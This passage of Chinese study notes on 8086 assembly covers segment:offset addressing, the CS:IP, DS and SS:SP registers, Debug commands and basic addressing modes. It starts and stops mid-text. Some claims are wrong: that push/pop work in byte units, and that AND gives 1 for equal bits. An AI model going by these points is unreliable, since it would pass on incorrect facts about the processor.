所以8086采用了一种在内部用两个16位地址合成的方法来形成一个20位的物理地址。流程如下&lt;/p&gt;

&lt;p&gt;1.CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址。&lt;/p&gt;

&lt;p&gt;2.段地址和偏移地址通过内部总线送入地址加法器。&lt;/p&gt;

&lt;p&gt;3.地址加法器将两个16位的地址合成位一个20位的物理地址。&lt;/p&gt;

&lt;p&gt;4.地址加法器通过内部总线将20位物理地址送入输入输出控制电路。&lt;/p&gt;

&lt;p&gt;5.输入输出控制电路将20位物理地址送上地址总线。&lt;/p&gt;

&lt;p&gt;6.20位物理地址被地址总线传送到存储器。&lt;/p&gt;

&lt;p&gt;地址加法器采用&lt;code class=&quot;highlighter-rouge&quot;&gt;物理地址=段地址x16+偏移地址&lt;/code&gt;的方法用段地址和偏移地址合成物理地址。
传入段地址1230和00C8两个地址，把段地址x16即左移一位（二进制的左移4位），变成12300。然后和偏移地址相加得到123CB。&lt;/p&gt;

&lt;p&gt;段地址在8086的段寄存器中存放，8086有4个段寄存器&lt;code class=&quot;highlighter-rouge&quot;&gt;CS、DS、SS、ES&lt;/code&gt;。&lt;/p&gt;

&lt;h3 id=&quot;指令寄存器csip&quot;&gt;指令寄存器CS，IP&lt;/h3&gt;

&lt;p&gt;CS和IP是8086中最关键的寄存器，它们只是了CPU当前要读取指令的地址。CS为代码段寄存器，IP为指令指针寄存器，从名称上我们可以看出它们和指令的关系。
在8086中，任意时刻，设CS中的内容为&lt;code class=&quot;highlighter-rouge&quot;&gt;M&lt;/code&gt;，IP中的内容为&lt;code class=&quot;highlighter-rouge&quot;&gt;N&lt;/code&gt;，8086将从&lt;code class=&quot;highlighter-rouge&quot;&gt;Mx16+N&lt;/code&gt;单元开始，读取一条指令并执行。
也就是说任意时刻CPU将CS:IP指向的内容当做命令执行。读取一条指令后，IP中的值自动增加，让CPU读取下一条指令，当前指令长度决定了IP的增加值。
具体流程如下&lt;/p&gt;

&lt;p&gt;1.从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器；&lt;/p&gt;

&lt;p&gt;2.IP=IP+所读取指令的长度，从而指向下一条指令；&lt;/p&gt;

&lt;p&gt;3.执行指令。转到步骤1，重复。&lt;/p&gt;

&lt;p&gt;在8086中，加电启动或复位后，CS=FFFFH，IP=0000。即FFFF0H是开机后执行的第一条指令。&lt;/p&gt;

&lt;p&gt;CS和IP不能通过MOV来赋值，能够修改CS、IP内容的指令被统称为&lt;code class=&quot;highlighter-rouge&quot;&gt;转移指令&lt;/code&gt;。最简单的就是&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp&lt;/code&gt;。
当我们想修改CS、IP的内容可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;jmp 段地址:偏移地址&lt;/code&gt;这样的指令来完成。如&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jmp 2AE3:3  -&amp;gt;  CS=2AE3H IP=0003H  -&amp;gt; 2AE33H
jmp 3:0B16  -&amp;gt;  CS=0003H IP=0B16H  -&amp;gt; 00B46H
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;若我们只想修改IP的内容，需要用一个寄存器做中转。如&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ax = 1000H;
jmp ax,
IP就变为了1000H，CS不变。含义上和MOV IP，AX 类似。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;内存中字的存储&quot;&gt;内存中字的存储&lt;/h3&gt;
&lt;p&gt;CPU中，用16位寄存器来存储一个字，在内存中一个字要用两个地址连续的字节单元来存放，这个字的低位字节存放在低地址单元中，高位字节存放在高地址单元中。&lt;/p&gt;

&lt;h3 id=&quot;ds段地址寄存器与address偏移地址&quot;&gt;DS段地址寄存器与[address]偏移地址&lt;/h3&gt;
&lt;p&gt;8086中内存地址由段地址和偏移地址组成，DS寄存器通常用来存放将要访问数据的段地址。
使用&lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax，[偏移地址]&lt;/code&gt;就能把&lt;code class=&quot;highlighter-rouge&quot;&gt;DSx16+偏移地址&lt;/code&gt;的值取出来放到ax中。
给DS寄存器赋值需要通过一个寄存器来中转。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-`&quot;&gt;mov bx,1000H
mov ds,bx
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;常用指令&quot;&gt;常用指令&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;指令形式&lt;/th&gt;
      &lt;th&gt;例子&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;mov 寄存器,数据&lt;/td&gt;
      &lt;td&gt;mov ax,8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mov 寄存器,寄存器&lt;/td&gt;
      &lt;td&gt;mov ax,bx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mov 寄存器,内存单元&lt;/td&gt;
      &lt;td&gt;mov ax,[0]&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mov 内存单元,寄存器&lt;/td&gt;
      &lt;td&gt;mov [0],ax&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mov 段寄存器,寄存器&lt;/td&gt;
      &lt;td&gt;mov ds,ax&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;指令形式&lt;/th&gt;
      &lt;th&gt;例子&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;add 寄存器,数据&lt;/td&gt;
      &lt;td&gt;add ax,8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;add 寄存器,寄存器&lt;/td&gt;
      &lt;td&gt;add ax,bx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;add 寄存器,内存单元&lt;/td&gt;
      &lt;td&gt;add ax,[0]&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;add 内存单元,寄存器&lt;/td&gt;
      &lt;td&gt;add [0],ax&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;指令形式&lt;/th&gt;
      &lt;th&gt;例子&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;sub 寄存器,数据&lt;/td&gt;
      &lt;td&gt;sub ax,8&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;sub 寄存器,寄存器&lt;/td&gt;
      &lt;td&gt;sub ax,bx&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;sub 寄存器,内存单元&lt;/td&gt;
      &lt;td&gt;sub ax,[0]&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;sub 内存单元,寄存器&lt;/td&gt;
      &lt;td&gt;sub [0],ax&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;栈和sssp寄存器&quot;&gt;栈和SS，SP寄存器&lt;/h3&gt;

&lt;p&gt;栈和收纳箱有点像，最先放进去的东西，最后才能拿出来，先进后出，后进先出。
8086入栈和出栈指令为&lt;code class=&quot;highlighter-rouge&quot;&gt;PUSH&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;POP&lt;/code&gt;。8086的入栈和出栈都是以字节为单位。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;push ax表示将寄存器ax中的数据送入栈中。
pop ax表示从栈顶取出数据送入ax。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;8086中有两个寄存器，段寄存器SS和寄存器SP，栈顶的段地址存放在SS中，偏移地址存放在SP中。任意时刻，SS:SP指向栈顶元素。push指令和pop指令执行时，CPU通过SS和SP找到栈顶的地址。
push指令的执行过程如下&lt;/p&gt;

&lt;p&gt;1.SP向上移动2位。SP=SP-2。&lt;/p&gt;

&lt;p&gt;2.将数据放入SS:SP指向的内存单元。&lt;/p&gt;

&lt;p&gt;可以看出入栈时，栈顶从高地址向低地址方向移动。&lt;/p&gt;

&lt;p&gt;pop和push的执行过程相反
1.将SS:SP指向内存单元处的数据送入ax中。
2.SP向下移动2位。SP=SP+2。&lt;/p&gt;

&lt;h1 id=&quot;debug使用&quot;&gt;Debug使用&lt;/h1&gt;
&lt;p&gt;Debug常用功能&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;column&lt;/th&gt;
      &lt;th&gt;column&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;R&lt;/td&gt;
      &lt;td&gt;查看、改变CPU寄存器的内容&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;D&lt;/td&gt;
      &lt;td&gt;查看内存中的内容&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;E&lt;/td&gt;
      &lt;td&gt;改写内存中的内容&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;U&lt;/td&gt;
      &lt;td&gt;将内存中的机器指令翻译成汇编指令&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;T&lt;/td&gt;
      &lt;td&gt;执行一条机器指令&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;以汇编指令的格式在内存中写入一条机器指令&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;r命令&quot;&gt;R命令&lt;/h3&gt;
&lt;p&gt;R命令直接输入是查看寄存器内容，&lt;code class=&quot;highlighter-rouge&quot;&gt;R 寄存器&lt;/code&gt;表示要修改寄存器的值，按&lt;code class=&quot;highlighter-rouge&quot;&gt;Enter&lt;/code&gt;键后，出现&lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt;输入你想改的值。&lt;/p&gt;

&lt;h3 id=&quot;d命令&quot;&gt;D命令&lt;/h3&gt;
&lt;p&gt;为设置地址的&lt;code class=&quot;highlighter-rouge&quot;&gt;D&lt;/code&gt;命令会列出Debug预设的地址的内容。D传入一个地址，&lt;code class=&quot;highlighter-rouge&quot;&gt;D 段地址:偏移地址&lt;/code&gt;，会显示从指定内存单元开始的128个内存单元的内容。当传入过一次地址后，直接输入&lt;code class=&quot;highlighter-rouge&quot;&gt;D&lt;/code&gt;会列出后续的内容。&lt;/p&gt;

&lt;h3 id=&quot;e命令&quot;&gt;E命令&lt;/h3&gt;
&lt;p&gt;E命令通过&lt;code class=&quot;highlighter-rouge&quot;&gt;E 段地址:偏移地址&lt;/code&gt;选定要修改的起始单元，会让你一次输入要为的值。&lt;/p&gt;

&lt;p&gt;直接输入16精致数据&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-e 1000:0 b8 01 00 b9 02 00 01 c8
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;可以直接用E命令写入字符。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-e 1000:0 'a' 'b' 'c' 1 2 3 4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;e命令也可以直接输入字符串&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-e 1000:0 &quot;helloworld&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;可以通过e命令输入16精制的命令的机器码，然后用U命令查看啊，机器指令和对应的汇编指令。&lt;/p&gt;

&lt;h3 id=&quot;u命令&quot;&gt;U命令&lt;/h3&gt;

&lt;p&gt;U命令可以查看内存里的机器指令和对应的汇编指令。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;U 1000:0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;a命令&quot;&gt;A命令&lt;/h3&gt;

&lt;p&gt;T命令可以执行内存里的指令。
先用R命令修改CS和IP为1000:0，然后直接输入T即可执行一条指令。执行后IP会对应自增，要执行下一条指令直接再次输入T即可。&lt;/p&gt;

&lt;p&gt;A命令可以通过汇编指令的形式写入指令。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-a 1000:0
1000:0000 mov ax,1
.
.
.
1000:000D add ax,ax
依次输入指令。两次回车结束
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;伪指令&quot;&gt;伪指令&lt;/h1&gt;

&lt;h3 id=&quot;segment和ends&quot;&gt;segment和ends&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;segment&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;ends&lt;/code&gt;是一对成对使用的伪指令，作用是定义一个段，&lt;code class=&quot;highlighter-rouge&quot;&gt;segment&lt;/code&gt;表示段开始，&lt;code class=&quot;highlighter-rouge&quot;&gt;ends&lt;/code&gt;表示段结束。
用法：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;段名 segment

	代码在此

段名 ends
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;end&quot;&gt;end&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;end&lt;/code&gt;是一个汇编程序的结束标记，编译器遇到&lt;code class=&quot;highlighter-rouge&quot;&gt;end&lt;/code&gt;就会结束后面的编译。&lt;/p&gt;

&lt;h3 id=&quot;assume&quot;&gt;assume&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;assume&lt;/code&gt;表示“假设”，它假设某一寄存器和程序中的某一个用&lt;code class=&quot;highlighter-rouge&quot;&gt;segment...ends&lt;/code&gt;定义的段相关联。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;assume cs:codesg 	//因为段的内容是代码段，所以把codesg代码段和cs寄存器联系起来

codesg segment 	  //codesg代码段开始
    mov ax,0H
    
    mov ax,4c00H     //这两句代码表示程序返回
    int 21H
codesg ends 		 //codesg代码段结束

end //程序结束
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;bx和loop指令&quot;&gt;[BX]和loop指令&lt;/h1&gt;

&lt;h3 id=&quot;bx&quot;&gt;[BX]&lt;/h3&gt;

&lt;p&gt;[BX]和[0]类似，需要配合ds段寄存器使用&lt;/p&gt;

&lt;p&gt;mov ax,[bx] //[bx]是偏移地址，ds是段地址，即&lt;/p&gt;

&lt;h3 id=&quot;inc&quot;&gt;inc&lt;/h3&gt;
&lt;p&gt;inc bx 表示bx中内容+1&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov bx,1
inc bx	//bx=2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;loop循环&quot;&gt;[loop]循环&lt;/h3&gt;

&lt;p&gt;loop循环的次数是cx寄存器控制的。&lt;/p&gt;

&lt;p&gt;loop执行步骤：&lt;/p&gt;

&lt;p&gt;1.cx-1&lt;/p&gt;

&lt;p&gt;2.判断cx的值，不为0就跳转至标号处执行，为0就向下执行。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,2
    mov cx,10 //设置执行的次数
s:  add ax,ax //设置要重复执行的标号
    loop s
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;包含多个段的程序&quot;&gt;包含多个段的程序&lt;/h1&gt;

&lt;h3 id=&quot;在代码段中使用数据&quot;&gt;在代码段中使用数据&lt;/h3&gt;

&lt;p&gt;代码里面有数据的存在，需要致命程序的入口，不然不知道哪里开始是代码。标号会转化为一个入口地址，存储在可执行文件的描述信息中。当程序被加载入内存之后，加载者从程序的可执行文件的描述信息中读取到程序的入口地址，设置CS:IP。CPU就能从我们希望的地址处开始执行。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code
    code segment
    	dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h//声明一些数据
        start: mov bx,0//添加一个标号start
               mov ax,0
               
               mov cx,8
            s: add ax,cs:[bx]
               add bx,2
               loop s
               
               mov ax,4c00h
               int 21h
	code ends
    end start//这里指明了程序的入口标号。
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;数据代码栈放入不同的段&quot;&gt;数据、代码、栈放入不同的段&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assyme cs:code,ds:data,ss:stack  //把code和cs寄存器，data和ds寄存器，stack和ss寄存器关联起来
    data segment  //数据段开始，data已经和ds寄存器相关联了
    	dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h
    data ends     //数据段结束
    
    stack segment //栈段开始
 	    dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    stack ends    //栈段结束
    
    code segment  //代码段开始
    	start: mov ax,stack//栈顶地址初始化，段地址为stack的起始段地址
               mov ss,ax
               mov sp,20h  //ss:sp指向stack:20
               
               mov ax,data //数据地址初始化到data的起始段地址
               mov ds,ax
               mov bx,0    //指向数据的第一个单元
               
               mov cx,8    //设置循环次数
            s: push [bx]   //把ds:bx数据入栈
               add bx,2    //指向下一个数据
               loop s      //循环
               
               mov bx,0
               mov cx,8
           s0: pop [bx]    //出栈到ds:bx，上一个循环最后入栈的现在在最上面，第一个出栈
               add bx,2    //偏移地址指向下一个位置
               loop s0
               
               mov ax,4c00h//中断程序
               int 21h
    code ends     //代码段结束
    end start     //指明程序执行入口
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面代码中的code，data，stack没有实际意义，只是方便我们辨识，段中的内容不会被自动识别为数据还是栈还是指令，这些都是由CS:IP,SS:SP,DS的设置来决定的，
CS:IP指向就当指令来执行。
SS:SP指向就当栈来执行。
DS指向就当数据来执行&lt;/p&gt;

&lt;h1 id=&quot;更灵活的定位内存地址的方法&quot;&gt;更灵活的定位内存地址的方法&lt;/h1&gt;

&lt;h3 id=&quot;and和or指令&quot;&gt;and和or指令&lt;/h3&gt;

&lt;h4 id=&quot;and&quot;&gt;and&lt;/h4&gt;

&lt;p&gt;and是逻辑与指令，按位比较，相同就为1，不同就为0&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,01100011B
    and al,00111011B
    得al = 00100011B
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;利用and指令能快速的把指定位设为0，其他位不变&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    and al,11111110B //将第0位设为0，其他位不变
    and al,01111111B //将第7位设为0，其他位不变
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;or&quot;&gt;or&lt;/h4&gt;

&lt;p&gt;or是逻辑或指令，按位比较，都为0才是0。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,01100011B
    or  al,00111011B
    得  al=01111011B
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;利用or能快速的将指定为设为1，其他位不变。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    or al,10000000B //将第7位设为1，其他位不变
    or al,00000001B //将第0位设为1，其他位不变
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;字符形式给出数据&quot;&gt;字符形式给出数据&lt;/h3&gt;

&lt;p&gt;在汇编中，可以用&lt;code class=&quot;highlighter-rouge&quot;&gt;'......'&lt;/code&gt;的方式给出数据，编译器会转化为对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;ASCII&lt;/code&gt;码。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code,ds:data
    
    data segment
    db 'unIX' 		//相当于db 75H,6EH,49H,58H
    db 'foRK'		//相当于db 66H,6FH,52H,4BH
    data ends
    
    code segment
    start: mov al,'a' //相当于mov al,61H
    	   mov bl,'b' //相当于mov al,62H
           
           mov ax,4c00h
           int 21h
    code ends
    end start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;大小写转换&quot;&gt;大小写转换&lt;/h3&gt;

&lt;p&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;ASCII&lt;/code&gt;中，同一个字母的大小写&lt;code class=&quot;highlighter-rouge&quot;&gt;ASCII&lt;/code&gt;码相差&lt;code class=&quot;highlighter-rouge&quot;&gt;20H&lt;/code&gt;，即十进制的&lt;code class=&quot;highlighter-rouge&quot;&gt;32&lt;/code&gt;。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;字母&lt;/th&gt;
      &lt;th&gt;16进制&lt;/th&gt;
      &lt;th&gt;二进制&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;A&lt;/td&gt;
      &lt;td&gt;41&lt;/td&gt;
      &lt;td&gt;01000001&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;a&lt;/td&gt;
      &lt;td&gt;61&lt;/td&gt;
      &lt;td&gt;01100001&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;从2进制可以看出，第五位正好控制大小写，大写为0，小写为1。应为二进制的第五位刚好等于10进制的32，16进制的20H。&lt;/p&gt;

&lt;p&gt;这样，通过前面的&lt;code class=&quot;highlighter-rouge&quot;&gt;and&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;or&lt;/code&gt;就能轻松控制大小写了。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;and al,11011111B //将al中的ASCII码第五位置为0，变成大写字母
or  al,00100000B //将al中的ASCII码第五位置为1，变成小写字母
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;bxidata方式进行数组的处理&quot;&gt;[bx+idata]方式进行数组的处理&lt;/h3&gt;

&lt;p&gt;bx可以加一个起始偏移地址，不改变bx，可以在一个循环里，很方便的对多个偏移地址进行操作。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[bx+0]//起始偏移地址不变
[bx+5]//从第5个开始加偏移地址

//上面的代码可以简写成下面的样式，和C语言的数组很像。
0[bx]
5[bx]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;si和di&quot;&gt;SI和DI&lt;/h3&gt;

&lt;p&gt;si和di是8086中和bx功能相近的寄存器，不能分成2个8位寄存器来使用。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //这3段代码功能相同
    mov bx,0
    mov ax,[bx]
    
    mov si,0
    mov ax,[si]
    
    mov di,0
    mov ax,[di]
    
    //si和di一样能使用[si+idata]的形式
    mov ax,[si+100]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;bxsi和bxdi&quot;&gt;[bx+si]和[bx+di]&lt;/h3&gt;

&lt;p&gt;bx，si，di不仅能加一个数，还能用[bx+si]和[bx+di]的形式来指明一个内存单元&lt;/p&gt;

&lt;p&gt;也可以写成&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,[bx][si]//常用写法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;bxsiidata和bxdiidata&quot;&gt;[bx+si+idata]和[bx+di+idata]&lt;/h3&gt;

&lt;p&gt;除了bx和si，di的相加，还能再多加一个数。&lt;/p&gt;

&lt;p&gt;有下面及种写法&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,[bx+200+si]
    mov ax,[200+bx+si]
    mov ax,200[bx][si]
    mov ax,[bx].200[si]
    mov ax,[bx][si].200
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;bp&quot;&gt;bp&lt;/h3&gt;

&lt;p&gt;在[…]的用法中，只有4个寄存器能这样写，bx，si，di和bp&lt;/p&gt;

&lt;p&gt;前面讲到bx可以和si，di采用组合的形式来表示一个地址&lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax,[bx+200+si]&lt;/code&gt;。
bp一样也可以&lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax,[bp+200+si]&lt;/code&gt;，但是有一点bp和bx不能组合像&lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax,[bx+bp]&lt;/code&gt;是错误的。&lt;/p&gt;

&lt;p&gt;在[…]中使用寄存器bp，如果没有显性的给出段地址，段地址默认是在&lt;code class=&quot;highlighter-rouge&quot;&gt;ss&lt;/code&gt;中。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov ax,[bp] //mov ax,ss:bp
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h1 id=&quot;数据处理的两个基本问题&quot;&gt;数据处理的两个基本问题&lt;/h1&gt;

&lt;p&gt;指令执行前，所要处理的数据可以在3个地方：CPU内部、内存、端口。&lt;/p&gt;

&lt;h3 id=&quot;汇编中数据位置的表达&quot;&gt;汇编中数据位置的表达&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;汇编语言中用3个概念来表达数据的位置。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;1.立即数（idata）  &lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax,1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;2.寄存器	       &lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax,bx&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;3.段地址+偏移地址	&lt;code class=&quot;highlighter-rouge&quot;&gt;mov ax,[bx+si+8]&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;寻址方式&quot;&gt;寻址方式&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;寻址方式&lt;/th&gt;
      &lt;th&gt;名称&lt;/th&gt;
      &lt;th&gt;用法&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;[idata]&lt;/td&gt;
      &lt;td&gt;直接寻址&lt;/td&gt;
      &lt;td&gt;[idata]&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;[bx]&lt;/td&gt;
      &lt;td&gt;寄存器间接寻址&lt;/td&gt;
      &lt;td&gt;[bx]&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;[bx+idata]&lt;/td&gt;
      &lt;td&gt;寄存器相对寻址&lt;/td&gt;
      &lt;td&gt;用于结构体[bx].idata、用于数组idata[si]、用于二维数组[bx][idata]&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;[bx+si]&lt;/td&gt;
      &lt;td&gt;基址变址寻址&lt;/td&gt;
      &lt;td&gt;用于二维数组[bx][si]&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;[bx+si+idata]&lt;/td&gt;
      &lt;td&gt;相对基址变址寻址&lt;/td&gt;
